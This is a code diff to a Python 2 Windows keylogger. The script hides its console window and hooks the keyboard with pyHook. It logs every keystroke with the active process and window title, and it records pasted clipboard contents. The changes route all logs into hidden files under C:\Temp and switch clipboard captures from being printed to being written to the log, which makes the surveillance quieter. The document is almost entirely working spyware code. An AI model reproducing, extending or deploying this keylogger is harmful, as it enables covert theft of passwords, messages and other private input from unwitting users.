@@ -12,8 +12,6 @@ kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
 
-
-
 def hide():
     import win32console,win32gui
     window = win32console.GetConsoleWindow()
@@ -21,11 +19,12 @@ def hide():
     return True
 
 def create_log_file():
+	path = "C:\\Temp\\"
 	datetime = time.ctime()
 	datetime = '-'.join(datetime.split())
 	datetime = datetime.replace(":","")
 	target_file = datetime[4:]
-	file = open(target_file,'a')
+	file = open(path+target_file,'a')
 	file.write("Begin Log\n")
 	file.close()
 	return target_file
@@ -33,11 +32,12 @@ def create_log_file():
 target_file = create_log_file()
 
 def writeToFile(filename, key):
- 	if key is None:
+ 	path = "C:\\Temp\\"
+	if key is None:
 		 return False
 	else:
 		try:
-			target = open(filename,'a')
+			target = open(path+filename,'a')
 			target.write(key)
 			target.close()
 			return True
@@ -46,7 +46,8 @@ def writeToFile(filename, key):
 	
 def get_current_process():
 	global target_file
-	if target_file == False or os.path.getsize(target_file) > 8000L:
+	path = "C:\\Temp\\"
+	if target_file == False or os.path.getsize(path+target_file) > 8000L:
 		target_file = create_log_file()
 	#get a handle to the foreground window
 	hwnd = user32.GetForegroundWindow()
@@ -70,7 +71,7 @@ def get_current_process():
 	
 	#print out the title is we're in the right process
 	#print
-	if os.path.getsize(target_file) > 8000L or os.path.getsize(target_file) == 0:
+	if os.path.getsize(target_file) > 8000L or os.path.getsize(path+target_file) == 0:
 		target_file = create_log_file()
 	writeToFile(target_file,"[PID %s - %s - %s ]\n" % (process_id, executable.value,window_title.value))
 	#print
@@ -81,8 +82,9 @@ def get_current_process():
 	
 def KeyStroke(event):
 	global current_window
-	global target_file	
-	if target_file == False or os.path.getsize(target_file) > 8000L:
+	global target_file
+	path = "C:\\Temp\\"
+	if target_file == False or os.path.getsize(path+target_file) > 8000L:
 		target_file = create_log_file()
 
 	#check to see if target changed windows
@@ -99,7 +101,7 @@ def KeyStroke(event):
 			pasted_value = win32clipboard.GetClipboardData()
 			win32clipboard.CloseClipboard()
 			
-			print "[PASTE] - %s" % (pasted_value),
+			writeToFile(target_file,("[PASTE] - %s" % (pasted_value)))
 		
 		else:
 			#print "[%s]" % event.Key,  **FOR OUTPUT TO SCREEN**
@@ -113,4 +115,4 @@ hide()
 kl = pyHook.HookManager()
 kl.KeyDown = KeyStroke
 kl.HookKeyboard()
-pythoncom.PumpMessages()			
+pythoncom.PumpMessages()
